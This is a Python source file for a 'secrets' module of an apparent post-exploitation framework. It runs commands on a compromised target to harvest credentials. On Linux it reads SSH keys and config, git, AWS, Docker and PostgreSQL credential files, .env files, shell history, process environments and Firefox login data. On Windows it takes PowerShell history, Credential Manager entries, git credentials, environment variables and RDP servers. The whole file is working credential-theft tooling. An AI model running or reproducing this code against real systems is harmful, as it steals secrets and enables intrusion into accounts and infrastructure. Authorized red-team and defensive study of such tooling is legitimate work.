from __future__ import annotations
from koi.modules.blueprint import KoiModule
import json
import re
import os
from typing import Any, Dict, List


CRED_PATTERNS = re.compile(
    r'(password|passwd|pwd|api.?key|secret|token|authorization|bearer|'
    r'aws_|export.*=|impacket|secretsdump|hashes)',
    re.IGNORECASE
)

ENV_CRED_PATTERNS = re.compile(
    r'(password|passwd|secret|token|api.?key|key|credential|auth|user|username|'
    r'host|port|url|endpoint|database|db_|aws_|azure_|gcp_)',
    re.IGNORECASE
)

ENV_VAR_PATTERNS = re.compile(
    r'(aws|azure|gcp|api|secret|token|password|user|key|docker|github|gitlab|npm|ruby|python)',
    re.IGNORECASE
)


def parse_shell_history(content: str) -> List[str]:
    """Parse shell history and extract commands with credential patterns."""
    commands = []
    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        line = re.sub(r'\s+', ' ', line)
        if CRED_PATTERNS.search(line):
            if len(line) > 120:
                line = line[:117] + "..."
            commands.append(line)
    return commands[:20]


def parse_env_file(content: str) -> Dict[str, str]:
    """Parse .env file and extract only credential-like variables."""
    result = {}
    for line in content.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        if '=' in line:
            key, val = line.split('=', 1)
            key = key.strip()
            val = val.strip().strip('"\'')
            if ENV_CRED_PATTERNS.search(key) and val:
                result[key] = val
    return result


def parse_git_config(content: str) -> Dict[str, str]:
    """Parse git config output and extract remotes."""
    result = {}
    current_repo = None
    for line in content.split('\n'):
        line = line.strip()
        if not line:
            continue
        if line.startswith('[remote'):
            current_repo = line
        elif 'url =' in line and current_repo:
            url = line.split('url =', 1)[1].strip()
            if current_repo not in result:
                result[current_repo] = url
    return result


def parse_ssh_config(content: str) -> Dict[str, Dict[str, str]]:
    """Parse SSH config and extract interesting hosts."""
    result = {}
    current_host = None
    for line in content.split('\n'):
        line = line.strip()
        if line.lower().startswith('host '):
            current_host = line.split(None, 1)[1] if ' ' in line else None
        elif current_host and line and not line.startswith('#'):
            if '=' in line:
                key, val = line.split('=', 1)
                key = key.strip().lower()
                val = val.strip()
                if key in ['user', 'port', 'identityfile', 'hostname', 'proxycommand']:
                    if current_host not in result:
                        result[current_host] = {}
                    result[current_host][key] = val
    return result


def filter_env_vars(content: str) -> Dict[str, str]:
    """Filter environment variables for credential patterns."""
    result = {}
    for line in content.split('\n'):
        line = line.strip()
        if not line or '=' not in line:
            continue
        key, val = line.split('=', 1)
        key = key.strip()
        val = val.strip()
        if ENV_VAR_PATTERNS.search(key) and val:
            result[key] = val
    return result


def _count_findings(value) -> int:
    """Count leaf data points in a nested hunt result.

    Walks into nested collections: counting top-level keys would report one
    finding per category rather than the number of items actually found.
    """
    if isinstance(value, dict):
        return sum(_count_findings(v) for v in value.values())
    if isinstance(value, list):
        return len(value)
    return 1


class SecretsDumpModule(KoiModule):
    name        = "secrets"
    description = "Hunt for secrets, credentials, API keys, and sensitive data on the target."
    category    = "Enumeration"
    usage       = "secrets <id>"
    platform    = ["linux", "windows_ps"]

    def run(self) -> None:
        if self.session.os_type == "linux":
            self._run_linux()
        else:
            self._run_windows()

    def _run_linux(self) -> None:
        """Hunt for credentials on Linux targets."""
        self.status("Hunting for secrets on Linux...")

        # (display label, hunt method). Add a source by adding one row.
        hunts = [
            ("SSH Keys",              self._hunt_ssh_keys),
            ("Git Credentials",       self._hunt_git_creds),
            ("Shell History",         self._hunt_bash_history),
            ("Environment Variables", self._hunt_env_vars),
            ("PostgreSQL (.pgpass)",  self._hunt_pgpass),
            ("Docker Credentials",    self._hunt_docker),
            (".env Files",            self._hunt_env_files),
            ("API Keys",              self._hunt_api_keys),
            ("AWS Credentials",       self._hunt_aws),
            ("Process Environment",   self._hunt_process_env),
            ("Git Diffs",             self._hunt_git_diffs),
            ("Browser Secrets",       self._hunt_browser_secrets),
        ]

        total_found = 0
        for label, hunt in hunts:
            self.status(f"Hunting {label.lower()}...")
            result = hunt()
            if result:
                self._display_results(label, result)
                total_found += _count_findings(result)

        if total_found:
            self.success(f"Found {total_found} secret(s)")
        else:
            self.warn("No obvious secrets found")

    def _display_results(self, category: str, entries: Any) -> None:
        """Display results with adaptive formatting."""
        if isinstance(entries, dict):
            if len(entries) <= 6:
                self.box(f"[{category}]", entries)
            else:
                limited = dict(list(entries.items())[:6])
                self.box(f"[{category}] ({len(entries)} total)", limited)
        elif isinstance(entries, list):
            # Format list entries as a dict for clean display
            formatted = {f"[{i+1}]": cmd for i, cmd in enumerate(entries[:15])}
            self.box(f"[{category}] ({len(entries)} commands)", formatted)
        elif isinstance(entries, str):
            lines = entries.strip().split('\n')
            if len(lines) > 20:
                preview = "\n".join(lines[:15])
                self.box(f"[{category}] ({len(lines)} lines)", {"preview": preview})
            else:
                self.box(f"[{category}]", {"output": entries})
        else:
            self.box(f"[{category}]", {"data": str(entries)})

    def _hunt_ssh_keys(self) -> dict:
        """Extract SSH keys and config from ~/.ssh/"""
        result = {}

        # List private keys found
        keys_list = self._try_exec("ls ~/.ssh/ 2>/dev/null")
        if keys_list:
            key_patterns = re.compile(r'(id_.*|key_.*|.*_rsa|.*_ed25519)')
            keys = [k.strip() for k in keys_list.split('\n')
                   if k.strip() and key_patterns.match(k.strip())]
            if keys:
                result["Private Keys Found"] = ", ".join(keys[:15])

        # SSH config - parse for interesting hosts
        ssh_config = self._try_exec("cat ~/.ssh/config 2>/dev/null")
        if ssh_config:
            parsed = parse_ssh_config(ssh_config)
            if parsed:
                result["SSH Hosts Configured"] = str(len(parsed))

        # SSH agent keys
        agent_keys = self._try_exec("ssh-add -l 2>/dev/null")
        if agent_keys:
            key_count = len([l for l in agent_keys.split('\n')
                           if l.strip() and any(k in l for k in ['RSA', 'ED25519', 'ECDSA'])])
            if key_count > 0:
                result["SSH Agent Keys Loaded"] = f"{key_count} keys"

        return result

    def _hunt_git_creds(self) -> dict:
        """Extract git credentials."""
        result = {}

        # .git-credentials
        git_creds = self._try_exec("cat ~/.git-credentials 2>/dev/null")
        if git_creds:
            result[".git-credentials"] = git_creds

        # Git remotes from local repos
        git_dirs = self._try_exec(
            "find ~ -maxdepth 4 -name '.git' -type d 2>/dev/null"
        )

        if git_dirs:
            git_table = {}
            for gitdir in git_dirs.split('\n'):
                gitdir = gitdir.strip()
                if not gitdir:
                    continue
                repo = os.path.dirname(gitdir)
                config_path = self._shell_quote(f"{gitdir}/config")
                git_config = self._try_exec(f"cat {config_path} 2>/dev/null")
                if git_config:
                    parsed = parse_git_config(git_config)
                    for remote_section, url in parsed.items():
                        repo_name = repo.split('/')[-1]
                        if repo_name not in git_table:
                            git_table[repo_name] = url
            if git_table:
                result["Git Remotes"] = git_table

        return result

    def _hunt_bash_history(self) -> dict:
        """Check shell history for credentials."""
        result = {}

        # Bash history
        bash_raw = self._try_exec("cat ~/.bash_history 2>/dev/null")
        if bash_raw:
            bash_cmds = parse_shell_history(bash_raw)
            if bash_cmds:
                result["Bash History"] = bash_cmds

        # Zsh history
        zsh_raw = self._try_exec("cat ~/.zsh_history 2>/dev/null")
        if zsh_raw:
            zsh_cmds = parse_shell_history(zsh_raw)
            if zsh_cmds:
                result["Zsh History"] = zsh_cmds

        return result

    def _hunt_env_vars(self) -> dict:
        """Extract interesting environment variables."""
        result = {}

        env_output = self._try_exec("env")
        if env_output:
            filtered = filter_env_vars(env_output)
            if filtered:
                result["Sensitive Env Vars"] = filtered

        return result

    def _hunt_pgpass(self) -> dict:
        """Hunt PostgreSQL password file."""
        result = {}
        pgpass = self._try_exec("cat ~/.pgpass 2>/dev/null")
        if pgpass:
            result[".pgpass"] = pgpass
        return result

    def _hunt_docker(self) -> dict:
        """Hunt Docker credentials."""
        result = {}

        docker_config = self._try_exec("cat ~/.docker/config.json 2>/dev/null")
        if docker_config:
            result["Docker Config"] = docker_config

        return result

    def _hunt_api_keys(self) -> dict:
        """Hunt for API keys in common locations."""
        result = {}

        locations = [
            "~/.netrc",
            "~/.aws/credentials",
            "~/.aws/config",
            "~/.kube/config",
            "~/.ssh/authorized_keys",
            "~/.npmrc",
            "~/.gem/credentials",
            "~/.token",
            "~/.secrets"
        ]

        cmd = f"cat {' '.join(locations)} 2>/dev/null | head -20"
        output = self._try_exec(cmd)

        if output and output.strip():
            result["API Keys & Configs"] = output

        return result

    def _hunt_aws(self) -> dict:
        """Hunt AWS credentials."""
        result = {}

        aws_creds = self._try_exec("cat ~/.aws/credentials 2>/dev/null")
        if aws_creds:
            result["AWS Credentials"] = aws_creds

        return result

    def _hunt_env_files(self) -> dict:
        """Hunt .env files which often contain credentials."""
        result = {}

        content = self._try_exec(
            "find ~ -maxdepth 5 -type f -name '.env*' 2>/dev/null | head -15 | xargs -r cat 2>/dev/null"
        )

        if content:
            parsed = parse_env_file(content)
            if parsed:
                result[".env Files"] = parsed

        return result

    def _hunt_process_env(self) -> dict:
        """Extract environment variables from running processes."""
        result = {}

        proc_env = self._try_exec(
            "for pid in $(pgrep -u $USER 2>/dev/null | head -10); do "
            "tr '\\0' '\\n' < /proc/$pid/environ 2>/dev/null; "
            "done"
        )

        if proc_env:
            filtered = filter_env_vars(proc_env)
            if filtered:
                env_dict = {k: v for k, v in sorted(filtered.items())[:20]}
                result["Process Environment Vars"] = env_dict

        return result

    def _hunt_git_diffs(self) -> dict:
        """Hunt for recent git changes that might contain secrets."""
        result = {}

        git_dirs = self._try_exec(
            "find ~ -maxdepth 4 -name '.git' -type d 2>/dev/null"
        )

        if not git_dirs:
            return result

        secret_keywords = ['password', 'secret', 'token', 'api_key', 'credential', 'key', 'auth', 'bearer', 'authorization']
        repos_with_secrets = {}

        for gitdir in git_dirs.split('\n'):
            gitdir = gitdir.strip()
            if not gitdir:
                continue

            repo = os.path.dirname(gitdir)
            repo_name = repo.split('/')[-1]

            # Get git log with format for better parsing
            git_log = self._try_exec(
                f"cd {self._shell_quote(repo)} && "
                f"git --no-pager log --oneline -n 20 2>/dev/null"
            )

            if git_log:
                suspicious_commits = []
                for line in git_log.split('\n'):
                    line = line.strip()
                    if not line:
                        continue
                    if any(kw in line.lower() for kw in secret_keywords):
                        suspicious_commits.append(line)

                if suspicious_commits:
                    repos_with_secrets[repo_name] = suspicious_commits[:5]

        if repos_with_secrets:
            result["Git Commits with Secrets"] = repos_with_secrets

        return result

    def _hunt_browser_secrets(self) -> dict:
        """Hunt for Chrome and Firefox stored secrets."""
        result = {}

        # Chrome - check for Login Data
        chrome_paths = self._try_exec(
            "find ~/.config ~/.local/share -type f -name 'Login Data' 2>/dev/null"
        )
        if chrome_paths:
            chrome_files = [f.strip() for f in chrome_paths.split('\n') if f.strip()]
            if chrome_files:
                result["Chrome Profiles"] = f"{len(chrome_files)} profile(s) found"

        # Firefox - check for key databases
        firefox_keys = self._try_exec(
            "find ~/.mozilla/firefox -type f \\( -name 'key4.db' -o -name 'key3.db' \\) 2>/dev/null"
        )
        if firefox_keys:
            firefox_key_files = [f.strip() for f in firefox_keys.split('\n') if f.strip()]
            if firefox_key_files:
                result["Firefox Encrypted Keys"] = f"{len(firefox_key_files)} database(s)"

        # Firefox - extract hostnames from logins.json
        logins_content = self._try_exec(
            "find ~/.mozilla/firefox -type f -name 'logins.json' 2>/dev/null | xargs -r cat 2>/dev/null"
        )
        if logins_content:
            hosts = set()
            try:
                data = json.loads(logins_content)
                if isinstance(data, dict) and 'logins' in data:
                    for login in data.get('logins', []):
                        host = login.get('hostname', '')
                        if host and not host.startswith('chrome://'):
                            hosts.add(host)
            except (json.JSONDecodeError, ValueError):
                pass

            if hosts:
                result["Firefox Stored Hosts"] = ", ".join(sorted(list(hosts))[:15])

        return result

    def _run_windows(self) -> None:
        """Hunt for credentials on Windows targets."""
        self.status("Hunting for credentials on Windows...")

        # (display label, hunt method). Add a source by adding one row.
        hunts = [
            ("PowerShell History",    self._hunt_ps_history),
            ("Stored Credentials",    self._hunt_stored_creds),
            ("Git Credentials",       self._hunt_win_git),
            ("Environment Variables", self._hunt_win_env),
            ("RDP Connections",       self._hunt_rdp),
            ("Browser Data",          self._hunt_browser),
        ]

        total_found = 0
        for label, hunt in hunts:
            result = hunt()
            if result:
                self._display_results(label, result)
                total_found += _count_findings(result)

        if total_found:
            self.success(f"Found {total_found} secret(s)")
        else:
            self.warn("No obvious credentials found")

    def _hunt_ps_history(self) -> dict:
        """Extract PowerShell history."""
        result = {}

        ps_hist = self._win_query(
            "&{$hist = Get-History -ErrorAction SilentlyContinue | "
            "Where-Object {$_.CommandLine -match '(password|passwd|api|secret|token|credential)'}; "
            "if($hist) {$hist | Select-Object -ExpandProperty CommandLine | Select-Object -First 20 | Out-String}}"
        )

        if ps_hist.strip():
            result["PS History"] = ps_hist

        return result

    def _hunt_stored_creds(self) -> dict:
        """Extract stored credentials from Windows Credential Manager."""
        result = {}

        creds = self._win_query(
            "&{cmdkey /list 2>$null}"
        )

        if creds.strip() and "NONE" not in creds:
            result["Stored Credentials"] = creds

        return result

    def _hunt_win_git(self) -> dict:
        """Extract git credentials on Windows."""
        result = {}

        git_cfg = self._win_query(
            "&{git --no-pager config --global -l 2>$null | Select-String -Pattern '(user|credential|password)' | Out-String}"
        )

        if git_cfg.strip():
            result["Git Config"] = git_cfg

        git_creds_file = self._win_query(
            "&{$path = [Environment]::GetFolderPath('ApplicationData');"
            "$creds = Join-Path $path '.git-credentials';"
            "if(Test-Path $creds) {Get-Content $creds}}"
        )

        if git_creds_file.strip():
            result[".git-credentials"] = git_creds_file

        return result

    def _hunt_win_env(self) -> dict:
        """Extract sensitive environment variables."""
        result = {}

        env_vars = self._win_query(
            "&{Get-Item -Path Env:* | "
            "Where-Object {$_.Name -match '(AWS|AZURE|GCP|API|SECRET|TOKEN|PASSWORD|USER|KEY|DOCKER|GITHUB|GITLAB)' -and $_.Value} | "
            "Select-Object -Property Name, Value | Out-String}"
        )

        if env_vars.strip():
            result["Env Vars"] = env_vars

        return result

    def _hunt_rdp(self) -> dict:
        """Extract RDP saved connections."""
        result = {}

        rdp_data = self._win_query(
            "&{$reg = Get-ChildItem 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Default' "
            "-ErrorAction SilentlyContinue; "
            "if($reg) {$reg | Select-Object -ExpandProperty PSChildName | Out-String}}"
        )

        if rdp_data.strip():
            result["RDP Servers"] = rdp_data

        return result

    def _hunt_browser(self) -> dict:
        """Hunt browser stored passwords/data."""
        result = {}

        # Check for Chrome
        chrome = self._win_query(
            "&{$path = [Environment]::GetFolderPath('ApplicationData') + '\\Google\\Chrome\\User Data\\Local State'; "
            "if(Test-Path $path) {Get-Item -LiteralPath $path | Select-Object -ExpandProperty LastWriteTime}}"
        )

        if chrome.strip():
            result["Chrome Detected"] = "Chrome user data found"

        return result
